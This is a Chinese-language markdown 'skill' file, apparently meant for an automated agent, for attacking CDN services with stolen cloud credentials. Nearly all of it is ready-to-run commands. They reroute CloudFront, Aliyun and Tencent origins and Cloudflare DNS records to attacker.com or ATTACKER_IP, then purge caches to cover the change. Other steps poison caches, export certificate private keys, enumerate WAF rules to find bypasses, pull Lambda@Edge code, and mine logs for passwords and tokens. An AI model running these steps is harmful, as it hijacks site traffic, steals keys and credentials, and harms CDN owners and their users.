---
name: cdn-attack
type: attack
category: edge
platform: multiple
severity: medium
---

# CDN 攻击技能

## 触发条件

- 有云平台凭证
- 目标使用 CDN 服务
- 用户要求"攻击 CDN"

## 前置检查

```bash
# AWS CloudFront
aws cloudfront list-distributions

# Cloudflare
curl -X GET "https://api.cloudflare.com/client/v4/zones" \
  -H "Authorization: Bearer API_TOKEN"

# 阿里云 CDN
aliyun cdn DescribeUserDomains
```

## 攻击方法

### 方法 1: CloudFront 攻击

```bash
# 1. 列出所有 Distribution
aws cloudfront list-distributions --query 'DistributionList[].{Id:Id,Domain:DomainName}'

# 2. 获取 Distribution 配置
aws cloudfront get-distribution --id DISTRIBUTION_ID

# 3. 查看源站配置
aws cloudfront get-distribution ... | jq -r '.Distribution.DistributionConfig.Origins'

# 4. 搜索敏感信息
aws cloudfront get-distribution ... | grep -i "s3|origin|custom"
```

### 方法 2: CloudFront 源站劫持

```bash
# 1. 获取 Distribution 配置
aws cloudfront get-distribution-config --id DISTRIBUTION_ID > dist-config.json

# 2. 修改源站配置
jq '.DistributionConfig.Origins.Items[0].DomainName = "attacker.com"' \
  dist-config.json > new-config.json

# 3. 更新 Distribution
aws cloudfront update-distribution \
  --id DISTRIBUTION_ID \
  --distribution-config file://new-config.json \
  --if-match ETag

# 4. 清理缓存（攻击后）
aws cloudfront create-invalidation \
  --distribution-id DISTRIBUTION_ID \
  --paths "/*"
```

### 方法 3: Cloudflare 攻击

```bash
# 1. 列出所有 Zone
curl -X GET "https://api.cloudflare.com/client/v4/zones" \
  -H "Authorization: Bearer API_TOKEN" | jq -r '.result[].name'

# 2. 获取 DNS 记录
curl -X GET "https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records" \
  -H "Authorization: Bearer API_TOKEN"

# 3. 修改 DNS 记录（劫持流量）
curl -X PUT "https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records/RECORD_ID" \
  -H "Authorization: Bearer API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"A","name":"subdomain","content":"ATTACKER_IP","ttl":120}'

# 4. 清理缓存
curl -X POST "https://api.cloudflare.com/client/v4/zones/ZONE_ID/purge_cache" \
  -H "Authorization: Bearer API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"purge_everything":true}'
```

### 方法 4: 阿里云 CDN 攻击

```bash
# 1. 列出所有域名
aliyun cdn DescribeUserDomains

# 2. 获取域名配置
aliyun cdn DescribeDomainDetail --DomainName DOMAIN_NAME

# 3. 查看源站配置
aliyun cdn DescribeDomainDetail ... | grep -i "source"

# 4. 修改源站配置（如果有权限）
aliyun cdn ModifyDomainConfig \
  --DomainName DOMAIN_NAME \
  --SourceUrl "https://attacker.com"
```

### 方法 5: 腾讯云 CDN 攻击

```bash
# 1. 列出所有域名
tccli cdn DescribeDomains --offset 0 --limit 100

# 2. 获取域名配置
tccli cdn DescribeDetailConfig --DomainName DOMAIN_NAME

# 3. 查看源站配置
tccli cdn DescribeDetailConfig ... | grep -i "origin"

# 4. 修改源站配置
tccli cdn UpdateDomainConfig \
  --DomainName DOMAIN_NAME \
  --Origin "Origin={"Servers":[{"ServerId":"attacker.com","Type":"domain"}],"OriginType":"domain"}'
```

### 方法 6: 缓存投毒

```bash
# 1. 通过边缘节点投毒
# 如果发现缓存配置错误

# 2. HTTP 方法投毒
curl -X PURGE https://TARGET_URL/endpoint
curl -X POST https://TARGET_URL/endpoint --data "malicious"

# 3. 头部投毒
curl -X GET https://TARGET_URL/endpoint \
  -H "X-Forwarded-For: ATTACKER_IP" \
  -H "X-Real-IP: ATTACKER_IP"

# 4. URL 参数投毒
curl -X GET "https://TARGET_URL/endpoint?malicious=param"
```

### 方法 7: SSL/TLS 配置利用

```bash
# 1. 获取 SSL 证书
aws cloudfront get-distribution --id DISTRIBUTION_ID | \
  jq -r '.Distribution.DistributionConfig.ViewerCertificate'

# 2. 获取证书详情
aws acm list-certificates

# 3. 导出证书
aws acm export-certificate --certificate-arn CERT_ARN

# 4. 提取私钥（如果有权限）
aws acm export-certificate ... --private-key
```

### 方法 8: WAF 规则枚举

```bash
# 1. 检查 CloudFront 是否集成 WAF
aws cloudfront get-distribution --id DISTRIBUTION_ID | \
  jq -r '.Distribution.DistributionConfig.WebACLId'

# 2. 获取 WAF 配置
aws waf-regional get-web-acl --web-acl-id WEB_ACL_ID --region REGION

# 3. 分析 WAF 规则
aws waf-regional get-web-acl ... | jq -r '.WebACL.Rules[]'

# 4. 寻找绕过方法
```

### 方法 9: Lambda@Edge 利用

```bash
# 1. 检查 Lambda@Edge 函数
aws cloudfront get-distribution --id DISTRIBUTION_ID | \
  jq -r '.Distribution.DistributionConfig.DefaultCacheBehavior.LambdaFunctionAssociations'

# 2. 获取函数配置
aws lambda get-function --function-name FUNCTION_NAME --region REGION

# 3. 获取函数代码
aws lambda get-function --function-name FUNCTION_NAME --region REGION | \
  jq -r '.Code.Location'

# 4. 下载代码
curl -o function.zip $(aws lambda get-function ... | jq -r '.Code.Location')
unzip function.zip
cat *.js
```

### 方法 10: 日志和监控利用

```bash
# 1. 检查是否启用日志
aws cloudfront get-distribution --id DISTRIBUTION_ID | \
  jq -r '.Distribution.DistributionConfig.Logging'

# 2. 如果启用了 S3 日志
# 访问日志 Bucket
aws s3 ls s3://LOGS_BUCKET/

# 3. 下载日志
aws s3 sync s3://LOGS_BUCKET/ /tmp/cf-logs/

# 4. 分析日志中的敏感信息
grep -r "password|secret|token" /tmp/cf-logs/
```

## 验证成功

```bash
# 成功列出 Distribution
aws cloudfront list-distributions

# 成功获取配置
aws cloudfront get-distribution --id DISTRIBUTION_ID

# 成功访问 DNS 记录
curl -X GET "https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records" \
  -H "Authorization: Bearer API_TOKEN"
```

## 下一步

1. 分析 CDN 配置中的源站信息
2. 通过 CDN 劫持攻击后端服务
3. 利用 Lambda@Edge 代码注入
4. 通过日志分析用户行为
